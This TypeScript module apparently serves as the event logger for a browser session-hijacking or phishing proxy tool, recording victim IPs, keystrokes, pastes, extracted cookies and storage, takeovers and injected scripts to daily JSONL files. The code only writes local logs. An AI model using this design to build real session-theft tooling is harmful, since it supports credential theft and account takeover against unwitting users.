import { appendFile, mkdir } from 'fs/promises';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const LOGS_DIR = join(__dirname, '..', 'logs');

let logsReady = false;
async function ensureLogsDir(): Promise<void> {
  if (logsReady) return;
  await mkdir(LOGS_DIR, { recursive: true });
  logsReady = true;
}

function todayFile(): string {
  return join(LOGS_DIR, `sessions-${new Date().toISOString().slice(0, 10)}.jsonl`);
}

// ─── Event union ──────────────────────────────────────────────────────────────

export type SessionEvent =
  | { event: 'session_start'; browserId: string; ip: string; userAgent: string; target: string; viewport: { w: number; h: number } }
  | { event: 'session_end';   browserId: string; durationMs: number }
  | { event: 'navigation';    browserId: string; url: string }
  | { event: 'keylog';        browserId: string; entry: string }
  | { event: 'paste';         browserId: string; text: string }
  | { event: 'cookies_extracted'; browserId: string; cookieCount: number }
  | { event: 'storage_extracted'; browserId: string }
  | { event: 'takeover_start';    browserId: string }
  | { event: 'takeover_end';      browserId: string }
  | { event: 'js_injected';       browserId: string; script: string };

// ─── Writer ───────────────────────────────────────────────────────────────────

export async function logEvent(e: SessionEvent): Promise<void> {
  try {
    await ensureLogsDir();
    const line = JSON.stringify({ ts: new Date().toISOString(), ...e }) + '\n';
    await appendFile(todayFile(), line, 'utf-8');
  } catch (err) {
    console.error(`[session-logger] Failed to write log: ${(err as Error).message}`);
  }
}
